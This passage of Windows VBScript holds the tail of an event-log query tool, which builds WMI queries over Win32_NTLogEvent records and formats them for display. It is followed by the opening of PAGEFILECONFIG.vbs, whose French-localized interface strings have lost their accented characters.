                            "WHERE LogfileName=" & Chr(34) & strLogFile & Chr(34)

            Set objEnumerator = objService.ExecQuery(strTempQuery,,0)

            If Err.Number Then
                component.vbPrintf L_ExecuteQuery_ErrorMessage, Array(strLogFile)
                WScript.Quit(EXIT_METHOD_FAIL)
            End If

            ' check if given log is present
            If ObjEnumerator.Count <> 1 Then
                component.vbPrintf L_LogDoesNotExist_ErrorMessage, Array(strLogFile)
                'If  Count of Logs = 1  Quit  Here 
                If objLogs.Count= 1 Then
                     WScript.Quit(EXIT_INVALID_INPUT)
               End If  
               'If more proceed ..
                objLogs.Remove(strLogFile)
            Else
                ' get maximum number of records in that log(used if range specified)
                For each objInstance in objEnumerator
                    If objInstance.NumberOfRecords <> "" Then
                        objLogs.Item(strLogFile) = objInstance.NumberOfRecords
                    Else
                        objLogs.Item(strLogFile) = 0
                    End If
                Next
            End If
            Set ObjEnumerator = Nothing
        End If
    Next

    If objLogs.Exists("*") Then
        ' if the * is specified, populate array  with elements 
        objLogs.Remove("*")
        ' get the instances of the logs present in the system
        Set objEnumerator = objService.InstancesOf(CLASS_EVENTLOG_FILE)
        
         If Err.number  Then
            Wscript.Echo (L_InstancesFailed_ErrorMessage)
            WScript.Quit(EXIT_METHOD_FAIL)
         End If  
    
        ' if no logs present
        If objEnumerator.Count <= 0 Then
            WScript.Echo (L_InfoNoLogsPresent_Message) 
            WScript.Quit(EXIT_UNEXPECTED)
        Else
            For Each objInstance In objEnumerator
                If Not IsEmpty(objInstance.LogfileName) Then
                            If NOT objLogs.Exists(LCase(objInstance.LogfileName)) Then
                                If objInstance.NumberOfRecords Then 
                                    objLogs.Add LCase(objInstance.LogfileName), objInstance.NumberOfRecords
                                Else
                                    objLogs.Add LCase(objInstance.LogfileName), 0
                                End If
                            End If
                End If
            Next
        End If
    End If

End Sub

'********************************************************************
'* Function: BuildFiltersForQuery
'*
'* Purpose:  Builds the query with the filter arguments
'*
'* Input:    [in] arrFilters    the array containing the filter conditions
'*
'* Output:   Returns the string to be concatenated to the main query
'*
'********************************************************************
Function BuildFiltersForQuery(ByVal arrFilters)
    ON ERROR RESUME NEXT
    Err.Clear

    Dim strTempFilter    ' to store the return string
    Dim i                ' used in loop

    strTempFilter = ""
    For i = 0 to UBound(arrFilters)
            strTempFilter = strTempFilter & " AND "
            strTempFilter = strTempFilter & arrFilters(i)
    Next
     
    BuildFiltersForQuery = strTempFilter

End Function 

'********************************************************************
'* Function : BuildRangeForQuery
'*
'* Purpose:  Builds the range boundaries to display the records.
'*
'* Input:   [in] strRange             ' the range specified by the user
'*                                      Will be in the format N, -N or N-N
'*          [in]  intFiltersSpecified ' array containing the filters number
'*          [in]  objService          ' the service object
'*          [out] intRecordRangeFrom  ' where do we start the display of records?
'*          [out] intRecordRangeTo    ' where do we stop displaying records
'*          [out] strFilterLog        ' log file to build query
'*          [out] strQuery            ' to build query according to given  Range Type 
'* Output:   Sets the value for the start and end of display boundaries.
'*
'********************************************************************
Private Function BuildRangeForQuery(ByVal strRange, _
                               ByRef intRecordRangeFrom, _
                               ByRef intRecordRangeTo,_
                               ByVal intFiltersSpecified,_
                               ByRef strQuery,_
                               ByVal ObjService,_
                               ByVal strFilterLog )

    ON ERROR RESUME NEXT
    Err.Clear

    Dim intMaxEventRecordsPresent   ' to store the max recods in the log
    Dim arrRangeValues              ' to store the split values if range is of the type N-N
    Dim objInstance                 ' to refer to the instances of the objEnumerator
    Dim objEnumerator               ' to store the results of the query is executed 
    Dim FilterRecordCount           ' to store the count of records if filter with +N  specified     
    
    FilterRecordCount  = 0         

        BuildRangeForQuery  = strquery    'intialize  

    Dim currentMaxRecordnumber  'curentMaxrecord number   
    Dim currentMinRecordnumber  'curentMinrecord number  

    currentMaxRecordnumber = 0
    currentMinRecordnumber = 0 
    
    ' save the max. no. of records available in the current log
    intMaxEventRecordsPresent = intRecordRangeTo


           ' find  the count of events / logfile   if Filter is  specified .
        If intFiltersSpecified >= 0 Then 
                    Set objEnumerator = objService.ExecQuery(strQuery,"WQL",0,null)
                                If Err.number Then      
                                    component.vbPrintf L_ExecuteQuery_ErrorMessage, Array(strFilterLog)
                                    Exit Function 
                                End if  
                                
                                FilterRecordCount= objEnumerator.count
                
                    Set objEnumerator= Nothing  'releases the memory 
        End If   
    
    ' check the type of range specified ( first N / last N /    N1 - N2 )
    If ( IsNumeric(strRange) ) Then

        ' range is first N or last N
        ' now check whether it is first N or last N
        If strRange < 0  Then
                            If intFiltersSpecified >= 0 Then
                                        ' first  N  records   
                                        ' initial the counter so that all the out is displayed
                            
                                            If   FilterRecordCount   >  CLng(Abs(strRange))  then
                                                    intRecordRangeFrom = FilterRecordCount    -  CLng(Abs(strRange)) + 1 
                                                    intRecordRangeTo   = FilterRecordCount   
                                             Else
                                                    intRecordRangeFrom = 0 
                                                    intRecordRangeTo   = FilterRecordCount   
                                            End If 

                                Else        

                                            Set objEnumerator = objService.ExecQuery(strQuery,"WQL",48,null)
                                                    For Each objInstance  In  objEnumerator
                                                              currentMaxRecordnumber= objInstance.RecordNumber
                                                          Exit for 
                                                    Next
                                        
                                            If  currentMaxRecordnumber >   intMaxEventRecordsPresent then
                                                         currentMinRecordnumber  = currentMaxRecordnumber - intMaxEventRecordsPresent
                                                        intMaxEventRecordsPresent =  currentMaxRecordnumber         
                                            End If  
                                                Set objEnumerator= Nothing  'releases the memory 

                                            ' N  means  record number <= N  
                                            ' initial the counter s+o that all the out is displayed
                                            ' build the query
                                             BuildRangeForQuery = strQuery & " AND RecordNumber <= "&   CLng(Abs(strRange))  + currentMinRecordnumber
                                            
                               End If 
                    Else
                                ' *** range is last N (i.e -N)
                                If intFiltersSpecified >= 0 Then

                                        If   FilterRecordCount   >  CLng(Abs(strRange))  then
                                            intRecordRangeFrom =0 
                                            intRecordRangeTo   =   CLng(Abs(strRange))  
                                        Else
                                            intRecordRangeFrom =0 
                                            intRecordRangeTo   =   FilterRecordCount   
                                        End If 

                                Else

                                        Set objEnumerator = objService.ExecQuery(strQuery,"WQL",48,null)
                                                'getting current max recordnumber  
                                                For Each objInstance  In  objEnumerator
                                                          currentMaxRecordnumber= objInstance.RecordNumber
                                                      Exit for 
                                                Next

                                        If  currentMaxRecordnumber >   intMaxEventRecordsPresent then
                                                     currentMinRecordnumber  = currentMaxRecordnumber - intMaxEventRecordsPresent
                                                    intMaxEventRecordsPresent =  currentMaxRecordnumber         
                                        End If          

                                                Set objEnumerator= Nothing  'releases the memory 

                                    ' -N  means  record number > (maxNumber - N )
                                    ' initial the counter so that all the out is displayed
                                    ' build the query
                                    If  CLng(Abs(strRange)) >  intMaxEventRecordsPresent Then
                                        'Show all records  
                                          BuildRangeForQuery =strQuery &  " AND RecordNumber > 0 "   
                                    Else 
                                            BuildRangeForQuery =strQuery &  " AND RecordNumber > " & intMaxEventRecordsPresent - CLng(Abs(strRange))
                                    End If
                                End If
                    End If
    Else
        ' range of records asked for N-N case
         arrRangeValues = split(strRange,"-", 2, VBBinaryCompare)   

        If intFiltersSpecified >= 0 Then
                If  CLng(arrRangeValues(0)) <   FilterRecordCount then
                
                     ' initial the counter so that all the out is displayed
                        intRecordRangeFrom = CLng(arrRangeValues(0))  
                        intRecordRangeTo    = CLng(arrRangeValues(1))
                Else 
                          'forcebly  putting the invaid query
                           'when  N1 >  FilterRecordCount to avoid unnessaray   looping between  intRecordRangeFrom TO  intRecordRangeTo
                             BuildRangeForQuery =strQuery &  " AND RecordNumber = 0 "
                End If  
        Else            
                Set objEnumerator = objService.ExecQuery(strQuery,"WQL",48,null)
                            For Each objInstance  In  objEnumerator
                                      currentMaxRecordnumber= objInstance.RecordNumber
                                  Exit for 
                            Next

                    If  currentMaxRecordnumber >   intMaxEventRecordsPresent then
                                 currentMinRecordnumber  = currentMaxRecordnumber - intMaxEventRecordsPresent
                                intMaxEventRecordsPresent =  currentMaxRecordnumber         
                    End If 
                Set objEnumerator= Nothing  'releases the memory 

            ' build the query
            BuildRangeForQuery =strQuery &  " AND RecordNumber >= "&  CLng(arrRangeValues(0))+ currentMinRecordnumber &  " AND RecordNumber <= " &   CLng(arrRangeValues(1)) + currentMinRecordnumber

        End If
    End If

End Function

'********************************************************************
'* Sub:     ShowEvents
'*
'* Purpose: Displays the EventLog details
'*
'* Input:   
'*  [in]    strMachine          machine to query events from
'*  [in]    strUserName         user name to connect to the machine
'*  [in]    strPassword         password for the user
'*  [in]    arrFilters          the array containing the filters
'*  [in]    strFormat           the display format
'*  [in]    strRange            the range of records required
'*  [in]    blnVerboseDisplay  flag to verify if verbose display is needed 
'*  [in]    blnNoHeader        flag to verify if noheader display is needed  
'*  [in]    objLogs             to store all the given logfles
'* Output:  Displays error message and quits if connection fails
'*          Calls component.showResults() to display the event records
'*
'********************************************************************
Private Sub ShowEvents(ByVal strMachine, _
                       ByVal strUserName, _
                       ByVal strPassword, _
                       ByRef arrFilters, _
                       ByVal strFormat, _
                       ByVal strRange, _
                       ByVal blnVerboseDisplay, _
                       ByVal blnNoHeader,_
                       ByRef objLogs)

    ON ERROR RESUME NEXT
    Err.Clear

    Dim objService         ' the service object
    Dim objEnumerator      ' to store the results of the query is executed
    Dim objInstance        ' to refer to the instances of the objEnumerator
    Dim strFilterLog       ' to refer to each log specified by the user
    Dim strTemp            ' to store the temporary variables
    Dim strQuery           ' to store the query obtained for given conditions
    Dim arrResults         ' to store the columns of each filter
    Dim arrHeader          ' to store the array header values
    Dim arrMaxLength       ' to store the maximum length for each column
    Dim arrFinalResults    ' used to send the arrResults to component.showResults()
    Dim arrTemp            ' to store temporary array values
    Dim intLoopCount       ' used in the loop
    Dim intElementCount    ' used as array subscript
    Dim strFilterQuery     ' to store the query for the given filters
    Dim intResultCount     ' used to  count no of records that are fetched  in the query        
    Dim blnPrintHeader     ' used to  check header is printed or not in resulted Query
    
    ' the following are used for implementing the range option
    Dim intRecordRangeFrom    ' to store the display record beginning number
    Dim intRecordRangeTo      ' to store the display record ending number
    Dim arrKeyName            ' to  store then key value of  dictionary   object
    Dim strTempQuery          ' to store a string for -N range values 
    Dim arrblnDisplay         ' array to show the  status of display of verbose mode  for showresults function
    Dim intDataCount       ' used in looping to  get value of  Insertion string   for the field "Description column" 
    Dim i                           'used for looping to enable All special privileges

   ' flag to set condition specific locale  & default value setting
    Dim  bLocaleChanged 
    bLocaleChanged =FALSE

    'Validating  the arguments   which is passed from commandline     
    If NOT (ValidateArguments(strMachine, strUserName, strPassword, _
            arrFilters, strFormat, strRange , blnNoHeader)) Then
           WScript.Quit(EXIT_UNEXPECTED)
    End If
  
  
  ' checking for UNC  format  for the system  name
   If  Left(strMachine,2) =  UNC_Format_Servername  Then
            If Len(strMachine) = 2  Then    
                 component.vbPrintf InvalidInputErrorMessage ,Array(Wscript.ScriptName)
                 WScript.Quit(EXIT_UNEXPECTED)
          End if 
           strMachine = Mid(strMachine,3,Len(strMachine))
   End If

  'getting the password ....
    If ((strUserName <> VBEmpty) AND (strPassword = VBEmpty)) Then
             strPassword = component.getPassword()
    End If

 ' To set  GetSupportedUserLocale for Some  Diff locales 
    bLocaleChanged =GetSupportedUserLocale()

    'Establish a connection with the server.
    If NOT component.wmiConnect(CONST_NAMESPACE_CIMV2 , _
                      strUserName , _
                      strPassword , _
                      strMachine  , _
                      blnLocalConnection , _
                      objService  ) Then

            Wscript.Echo(L_HintCheckConnection_Message)         
            WScript.Quit(EXIT_METHOD_FAIL) 
        
    End If

    ' set the previlige's  To query  all event's in eventlog's . 
    objService.Security_.Privileges.AddAsString("SeSecurityPrivilege")

    'Enable all privileges as some DC's were requiring special privileges
    For i = 1 to 26
        objService.Security_.Privileges.Add(i)
    Next

    ' get the HostName from the function
    strMachine = component.getHostName( objService)

    ' Validating  the Filters  which is passed from commandline    
    If UBound(arrFilters) >= 0 Then 
        ' filters are specified. Validate them
        If Not  ValidateFilters(arrFilters,objService ) Then 
            WScript.Quit(EXIT_INVALID_INPUT)
        End If
    End If
    
  
    blnPrintHeader = TRUE

    If blnNoHeader Then
        blnPrintHeader = FALSE
    End If

    ' Initialize - header to display, the maximum length of each column and 
    '              number of columns present
    arrHeader = Array(L_ColHeaderType_Text,L_ColHeaderEventcode_Text, L_ColHeaderDateTime_Text,_
                          L_ColHeaderSource_Text,L_ColHeaderComputerName_Text)
    ' first initialize the array with N/A    
    arrResults = Array(L_TextNa_Text,L_TextNa_Text,L_TextNa_Text,L_TextNa_Text,L_TextNa_Text,L_TextNa_Text,_
                            L_TextNa_Text,L_TextNa_Text)

    arrMaxLength = Array(13,6, 24, 17, 14, 15, 20,750)
    arrblnDisplay = Array(0, 0, 0, 0, 0, 1, 1, 1)

    If blnVerboseDisplay Then
        arrblnDisplay = Array(0, 0, 0, 0, 0, 0, 0,0)
        arrHeader = Array( L_ColHeaderType_Text,L_ColHeaderEventcode_Text, L_ColHeaderDateTime_Text, _
                          L_ColHeaderSource_Text,L_ColHeaderComputerName_Text,L_ColHeaderCategory_Text,_
                          L_ColHeaderUser_Text, L_ColHeaderDesription_Text) 
    End IF

        If UBound(arrFilters) >=0 Then
        strFilterQuery = BuildFiltersForQuery(arrFilters)
    End If
   
    ' call function to verify given log and also get records count in log
    Call VerifyLogAndGetMaxRecords(objService, objLogs)

    arrKeyName = objLogs.Keys 

    intResultCount = 0
    intLoopCount = 0

      'blank line before first data is  displayed on console
        WScript.Echo EmptyLine_Text 

    Do While (intLoopCount < objLogs.Count)

        'setting Header to print every Log file  explicilty
        If blnNoHeader Then
            blnPrintHeader = FALSE
        Else
                blnPrintHeader = TRUE
        End If
        

        If CInt(objLogs.Item(arrKeyName(intLoopCount))) > 0 Then        
            strFilterLog = arrKeyName(intLoopCount)
            intRecordRangeFrom = 0
            intRecordRangeTo = CInt(objLogs.Item(arrKeyName(intLoopCount))) 
            
            
            ' build the query
            strQuery = "Select * FROM Win32_NTLogEvent WHERE Logfile=" &_
                                Chr(34) & strFilterLog & Chr(34)

            If UBound(arrFilters) >=0  Then
                strQuery = strQuery & strFilterQuery 
            End If

            
            If Len(Trim(CStr(strRange))) > 0 Then
                ' building again query  for -N  condition in range switch   
                strQuery = BuildRangeForQuery(strRange,intRecordRangeFrom, _
                          intRecordRangeTo, UBound(arrFilters),strQuery,objService,strFilterLog)
                               
            End If

            ' process the results, else go for next log
            Set objEnumerator = objService.ExecQuery(strQuery,"WQL",48,null)
                
            If  Err.Number Then
                component.vbPrintf L_ExecuteQuery_ErrorMessage, Array(strFilterLog)
                ' if error occurred in the query, go for next log
                intLoopCount = intLoopCount + 1 
                Err.clear      ' for next loop  if more logs present
            Else

                intElementCount = 0

                ReDim arrFinalResults(CONST_ARRAYBOUND_NUMBER) 

                For each objInstance in objEnumerator

                    ' inside error trapping for most unexpected case...  
                    If Err.number   then  Exit For      

                    intResultCount = intResultCount + 1
                
                        ' print the header for each log file along  with Host Name 
                        'imp:: if  and  only if  have Data 
                    If  intResultCount = 1 Then
                            WScript.Echo(String(78,"-"))
                            component.vbPrintf L_InfoDisplayLog_Message ,Array(strFilterLog,strMachine)
                            WScript.Echo(String(78,"-"))
                    End If 

                    ' check whether the current record is fitting in
                    ' the required range
                    If ( intResultCount >= intRecordRangeFrom ) And _
                       ( intResultCount <= intRecordRangeTo ) Then
                       ' record fitting the range ... this has to be displayed

                        If objInstance.Type <> "" Then
                            arrResults(0) = objInstance.Type
                        Else
                            arrResults(0) = L_TextNa_Text
                        End If

                        If objInstance.EventCode <> "" Then
                            arrResults(1) = objInstance.EventCode
                        Else
                            arrResults(1) = L_TextNa_Text
                        End If

                        If (NOT IsEmpty(objInstance.TimeGenerated)) Then

                            strTemp = objInstance.TimeGenerated
                                   
                                   'is LOCALE CHANGED   
                                 If bLocaleChanged <> TRUE Then
                                      'format DatTime as DATE & "Space" & TIME    
                                       arrResults(2)= Formatdatetime( Mid(strTemp,5,2) & "/"  & Mid(strTemp,7,2) & "/"  &_
                                               Mid(strTemp,1,4)) & " " & formatdatetime( Mid(strTemp,9,2) & ":" &_
                                               Mid(strTemp,11,2) & ":" & Mid(strTemp,13,2))
                                  Else
                                     arrResults(2) = Mid(strTemp,5,2) & "/"  & Mid(strTemp,7,2) & "/"  &_
                                               Mid(strTemp,1,4) & " " & Mid(strTemp,9,2) & ":" &_
                                               Mid(strTemp,11,2) & ":" & Mid(strTemp,13,2)
                                 End  If 
               
                        Else
                                arrResults(2) = L_TextNa_Text
                        End If

                        If objInstance.SourceName <> "" Then
                            arrResults(3) = objInstance.SourceName
                        Else
                            arrResults(3) = L_TextNa_Text
                        End If

                        If objInstance.ComputerName <> "" Then
                                arrResults(4) =objInstance.ComputerName
                            Else
                                arrResults(4) = L_TextNa_Text
                            End If
                        
                    If blnVerboseDisplay Then
                            If objInstance.CategoryString <> "" Then
                                arrResults(5) = Replace(objInstance.CategoryString, VbCrLf, "")
                            Else
                                arrResults(5) = L_TextNone_Text   ' None display
                            End If

                            If (NOT IsNull(objInstance.User)) Then
                                arrResults(6) = objInstance.User
                            Else
                                arrResults(6) = L_TextNa_Text
                            End If

                            If objInstance.Message <> "" Then
                                arrResults(7) = Trim(Replace(objInstance.Message, VbCrLf, " "))
                            Else
                                'Check here eighter value in presenet "InsertionStrings" column .
                                If (NOT IsNull(objInstance.InsertionStrings)) Then
                                    arrTemp = objInstance.InsertionStrings
                                    'removing default value "N/A"
                                    arrResults(7)= ""
                                    For intDataCount = 0 to UBound(arrTemp)
                                    arrResults(7) = arrResults(7) & " " & arrTemp(intDataCount)
                                    Next

                                    arrResults(7) = Trim(arrResults(7))
                                Else
                                    arrResults(7) = L_TextNa_Text
                                End If

                            End If

                    End If
                        
                        ' add the record to the queue of records that has to be displayed
                        arrFinalResults( intElementCount ) = arrResults
                        intElementCount = intElementCount + 1       ' increment the buffer
                        ' check whether the output buffer is filled and ready for display
                        ' onto the screen or not
                        If intElementCount = CONST_ARRAYBOUND_NUMBER +1  Then
                                 ' Call the display function with required parameters
                                Call  component.showResults(arrHeader, arrFinalResults, arrMaxLength, _
                                          strFormat, blnPrintHeader, arrblnDisplay)
                                blnPrintHeader = FALSE
                                
                                Redim arrFinalResults(CONST_ARRAYBOUND_NUMBER) ' clear the existing buffer contents
                                intElementCount = 0     ' reset the buffer start
                        End If
                    End If

                    ' check whether the last record number that has to be displayed is
                    ' crossed or not ... if crossed exit the loop without proceeding further
                    If ( intResultCount >= intRecordRangeTo ) Then
                        ' max. TO range is crossed/reached ... no need of further looping
                        Exit For
                    End If
                Next

                ' check whether there any pending in the output buffer that has to be
                ' displayed
                If intElementCount > 0 Then
                    ' resize the array so that the buffer is shrinked to its content size
                    ReDim Preserve arrFinalResults( intElementCount - 1 )

                        ' Call the display function with required parameters
                    Call  component.showResults(arrHeader, arrFinalResults, arrMaxLength, _
                                strFormat, blnPrintHeader, arrblnDisplay)
                Else            ' array bounds checking
                    If intResultCount = 0 Then
                          'ie no records found  
                        If  UBound(arrFilters) >= 0  OR Len(Trim(CStr(strRange))) > 0 Then 
                            ' message no records present  if  filter specified  
                            component.vbPrintf L_InfoNoRecordsInFilter_Message, Array(strFilterLog)
                        Else
                            'message  no records present if filter not  specified
                            component.vbPrintf L_InfoNoRecords_Message, Array(strFilterLog)
                        End If 

                    End If ' intResultCount = 0

                End If ' array bounds checking
            End If 
        Else    
                        'message  no records present 
                        component.vbPrintf L_InfoNoRecords_Message, Array(arrKeyName(intLoopCount))
        End If

        ' re-initialize all the needed variables
        intResultCount = 0 
        Set objEnumerator = Nothing
        intLoopCount = intLoopCount + 1

        'blank line before end of the Next Each Log  file details
        WScript.Echo EmptyLine_Text 

    Loop    ' do-while

End Sub

'********************************************************************
'* Function: GetSupportedUserLocale
'*
'* Purpose:This function checks if the current locale is supported or not.
'*
'* Output:   Returns TRUE or FALSE
'*
'********************************************************************
Private Function GetSupportedUserLocale()

 ON ERROR RESUME NEXT
 Err.Clear

GetSupportedUserLocale =FALSE

CONST LANG_ARABIC           =  &H01
CONST LANG_HEBREW         =  &H0d
CONST LANG_HINDI            =  &H39
CONST LANG_TAMIL             =  &H49
CONST LANG_THAI               =  &H1e 
CONST LANG_VIETNAMESE  =  &H2a

Dim Lcid        'to store LocaleId

' get the current locale
 Lcid=GetLocale()

CONST PRIMARYLANGID = 1023 '0x3ff

Dim LANGID       'to store LangID

' Convert LCID >>>>>>>>>>>>> LANGID
' BIT Wise And Operation 
'formating to compare HEX Value's 
LANGID     = Hex ( Lcid AND   PRIMARYLANGID )
 
' check whether the current locale is supported by our tool or not
' if not change the locale to the English which is our default locale
 Select Case LANGID

	'here to chaeck the values  
    Case   Hex(LANG_ARABIC),Hex(LANG_HEBREW),Hex(LANG_THAI) ,Hex(LANG_HINDI ),Hex(LANG_TAMIL) ,Hex(LANG_VIETNAMESE)

             GetSupportedUserLocale =TRUE
             Exit Function
End Select

End Function


' ****************************************************************************************
'* Function : IsWinXP 
'*
'* Purpose:This function checks if the OS is XP  or Above.  
'*
'* Input:    [in]  Objservice     the service object
'* Output:   Returns TRUE or FALSE
'*
' ****************************************************************************************

Private Function IsWinXP ( ByVal objService)

 ON ERROR RESUME NEXT
 Err.Clear

    CONST WIN2K_MAJOR_VERSION = 5000
    CONST WINXP_MAJOR_VERSION = 5001

    Dim strQuery            ' to store the query to be executed
    Dim objEnum             ' collection object
    Dim objInstance         ' instance object
    Dim strVersion          ' to store the OS version
    Dim arrVersionElements  ' to store the OS version elements
    Dim CurrentMajorVersion ' the major version number

   ISWinXP= FALSE

    strQuery = "Select * From  Win32_operatingsystem"

    Set objEnum = objService.ExecQuery(strQuery,"WQL",0,NULL)

    For each objInstance in objEnum
        strVersion= objInstance.Version
    Next

    ' OS Version : 5.1.xxxx(Whistler), 5.0.xxxx(Win2K)
    arrVersionElements  = split(strVersion,".")
    ' converting to major version
    CurrentMajorVersion = arrVersionElements(0) * 1000 + arrVersionElements(1)

    ' Determine the OS Type
    '  WinXP  > Win2K  
    If CInt(CurrentMajorVersion) >=  CInt(WINXP_MAJOR_VERSION) Then
              IsWinXP= TRUE
   End If

End Function

'********************************************************************
'* Sub:     ShowUsage
'*
'* Purpose: Shows the correct usage to the user.
'*
'* Output:  Help messages are displayed on screen.
'*
'********************************************************************

Private Sub ShowUsage ()

    WScript.Echo EmptyLine_Text     
    WScript.Echo L_ShowUsageLine01_Text        
    WScript.Echo L_ShowUsageLine02_Text        
    WScript.Echo EmptyLine_Text     
    WScript.Echo L_ShowUsageLine03_Text        
    WScript.Echo L_ShowUsageLine04_Text        
    WScript.Echo L_ShowUsageLine05_Text        
    WScript.Echo EmptyLine_Text    
    WScript.Echo L_ShowUsageLine06_Text       
    WScript.Echo L_ShowUsageLine07_Text       
    WScript.Echo EmptyLine_Text      
    WScript.Echo L_ShowUsageLine08_Text       
    WScript.Echo L_ShowUsageLine09_Text      
    WScript.Echo EmptyLine_Text      
    WScript.Echo L_ShowUsageLine10_Text      
    WScript.Echo L_ShowUsageLine11_Text  
    WScript.Echo EmptyLine_Text       
    WScript.Echo L_ShowUsageLine12_Text         
    WScript.Echo L_ShowUsageLine13_Text  
    WScript.Echo EmptyLine_Text       
    WScript.Echo L_ShowUsageLine14_Text        
    WScript.Echo L_ShowUsageLine15_Text        
    WScript.Echo EmptyLine_Text  
    WScript.Echo L_ShowUsageLine16_Text      
    WScript.Echo L_ShowUsageLine17_Text      
    WScript.Echo L_ShowUsageLine18_Text  
    WScript.Echo EmptyLine_Text    
    WScript.Echo L_ShowUsageLine19_Text      
    WScript.Echo L_ShowUsageLine20_Text   
    WScript.Echo L_ShowUsageLine21_Text   
    WScript.Echo L_ShowUsageLine22_Text
    WScript.Echo L_ShowUsageLine23_Text 
    WScript.Echo EmptyLine_Text
    WScript.Echo L_ShowUsageLine24_Text      
    WScript.Echo L_ShowUsageLine25_Text      
    WScript.Echo L_ShowUsageLine26_Text  
    WScript.Echo EmptyLine_Text        
    WScript.Echo L_ShowUsageLine27_Text         
    WScript.Echo EmptyLine_Text     
    WScript.Echo L_ShowUsageLine28_Text         
    WScript.Echo EmptyLine_Text         
    WScript.Echo L_ShowUsageLine29_Text        
    WScript.Echo L_ShowUsageLine30_Text       
    WScript.Echo L_ShowUsageLine31_Text       
    WScript.Echo L_ShowUsageLine32_Text       
    WScript.Echo L_ShowUsageLine33_Text       
    WScript.Echo L_ShowUsageLine34_Text       
    WScript.Echo L_ShowUsageLine35_Text         
    WScript.Echo L_ShowUsageLine36_Text         
    WScript.Echo L_ShowUsageLine37_Text         
    WScript.Echo L_ShowUsageLine38_Text         
    WScript.Echo EmptyLine_Text 
    WScript.Echo L_ShowUsageLine39_Text        
    WScript.Echo L_ShowUsageLine40_Text       
    WScript.Echo EmptyLine_Text 
    WScript.Echo L_ShowUsageLine41_Text        
    WScript.Echo L_ShowUsageLine42_Text        
    WScript.Echo L_ShowUsageLine43_Text        
    WScript.Echo L_ShowUsageLine44_Text      
    WScript.Echo L_ShowUsageLine45_Text      
    WScript.Echo L_ShowUsageLine46_Text      
    WScript.Echo L_ShowUsageLine47_Text     
    WScript.Echo L_ShowUsageLine48_Text     
    WScript.Echo L_ShowUsageLine49_Text     
    WScript.Echo L_ShowUsageLine50_Text     
    WScript.Echo L_ShowUsageLine51_Text    
    WScript.Echo L_ShowUsageLine52_Text    
    WScript.Echo L_ShowUsageLine53_Text    

End Sub

'-----------------------------------------------------------------------------
'                            End of the Script                                
'-----------------------------------------------------------------------------

  '******************************************************************************
'*
'* Copyright (c) Microsoft Corporation. All rights reserved.
'*
'* Module Name:    PAGEFILECONFIG.vbs
'*
'* Abstract:       Enables an administrator to display and configure
'*                 a systems paging file Virtual Memory settings.
'*
'*
'******************************************************************************

OPTION EXPLICIT

ON ERROR RESUME NEXT
Err.Clear

'******************************************************************************
' Start of Localization Content
'******************************************************************************

' constants used for format selection
CONST L_PatternFormat_Text                   = "^(table|list|csv)$"
CONST L_DefaultFormat_Text                   = "list"

' Valid volume pattern [ a,b drives are invalid ]
CONST L_VolumePatternFormat_Text             = "^([c-zC-Z]:|\*)$"

' constants for showresults
CONST L_Na_Text                              = "N/A"
CONST L_MachineName_Text                     = "Nom systme"
CONST L_User_Text                            = "Utilisateur"
CONST L_Password_Text                        = "Mot de passe"
CONST L_Intsize_Text                         = "Taille initiale"
CONST L_Maxsize_Text                         = "Taille maximale"
CONST L_Volume_Text                          = "Nom de volume"
CONST L_Format_Text                          = "Format"

' the column headers used in the output display
CONST L_ColHeaderHostname_Text               = "Nom de l'hte"
CONST L_ColHeaderDrive_Text                  = "Lecteur/Volume"
CONST L_ColHeaderVolumeLabel_Text            = "Nom de volume"
CONST L_ColHeaderFileName_Text               = "Emplacement\Nom de fichier"
CONST L_ColHeaderInitialSize_Text            = "Taille initiale"
CONST L_ColHeaderMaximumSize_Text            = "Taille maximale"
CONST L_ColHeaderCurrentSize_Text            = "Taille actuelle"
CONST L_ColHeaderFreeSpace_Text              = "Espace libre total"
CONST L_ColHeaderTotalMinimumSize_Text       = "Total (Tous les lecteurs) : Taille minimale"
CONST L_ColHeaderTotalRecommendedSize_Text   = "Total (Tous les lecteurs) : Taille recommande"
CONST L_ColHeaderTotalSize_Text              = "Total (Tous les lecteurs) : Actuellement allou"

' user reply for the warning messages
CONST L_UserReplyYes_Text                    = "Y"
CONST L_UserReplyNo_Text                     = "S"

' constants for CScript usage
CONST L_UseCscript1_ErrorMessage             = "Ce script devrait tre excut  partir de la ligne de commande en utilisant CSCRIPT.EXE."
CONST L_UseCscript2_ErrorMessage             = "Par exemple : CSCRIPT PAGEFILECONFIG.vbs <arguments>"
CONST L_UseCscript3_ErrorMessage             = "Pour dfinir CScript comme application par dfaut pour excuter les fichiers .vbs excutez la commande suivante"
CONST L_UseCscript4_ErrorMessage             = "       CSCRIPT //H:CSCRIPT //S"
CONST L_UseCscript5_ErrorMessage             = "Vous pouvez alors excuter ""PAGEFILECONFIG.vbs <arguments>"" sans faire prcder le script par CSCRIPT."

' common constants for showing help for all the options
CONST L_UsageDescription_Text                = "Description:"
CONST L_UsageParamList_Text                  = "Liste de paramtres :"
CONST L_UsageExamples_Text                   = "Exemples:"
CONST L_UsageMachineName_Text                = "    /S         Systme              Spcifie le systme distant auquel se  connecter."
CONST L_UsageUserNameLine1_Text              = "    /U         [Domaine\]utilisateur       Spcifie le contexte de l'utilisateur dans lequel"
CONST L_UsageUserNameLine2_Text              = "                           la commande doit s'excuter."
CONST L_UsagePasswordLine1_Text              = "    /P         Mot de passe            Spcifie le mot de passe pour le contexte"
CONST L_UsagePasswordLine2_Text              = "                           utilisateur donn."

' constants for showing help
CONST L_ShowUsageLine02_Text                 = "PAGEFILECONFIG.vbs /paramtre [arguments]"
CONST L_ShowUsageLine05_Text                 = "    Permet  un administrateur d'afficher et de configurer le fichier "
CONST L_ShowUsageLine06_Text                 = "    de mmoire virtuelle d'un systme."
CONST L_ShowUsageLine08_Text                 = "Liste de paramtres :"
CONST L_ShowUsageLine09_Text                 = "    /Change       Modifie le fichier d'change du systme"
CONST L_ShowUsageLine10_Text                 = "               Paramtres de la mmoire virtuelle."
CONST L_ShowUsageLine12_Text                 = "    /Create       Cre ou ajoute un ""fichier d'change"" supplmentaire sur le systme."
CONST L_ShowUsageLine14_Text                 = "    /Delete       Supprime un ""fichier d'change"" du systme."
CONST L_ShowUsageLine16_Text                 = "    /Query         Affiche le fichier d'change du systme"
CONST L_ShowUsageLine17_Text                 = "               Paramtres de la mmoire virtuelle."
CONST L_ShowUsageLine19_Text                 = "Exemples:"
CONST L_ShowUsageLine20_Text                 = "    PAGEFILECONFIG.vbs"
CONST L_ShowUsageLine21_Text                 = "    PAGEFILECONFIG.vbs /?"
CONST L_ShowUsageLine22_Text                 = "    PAGEFILECONFIG.vbs /Change /?"
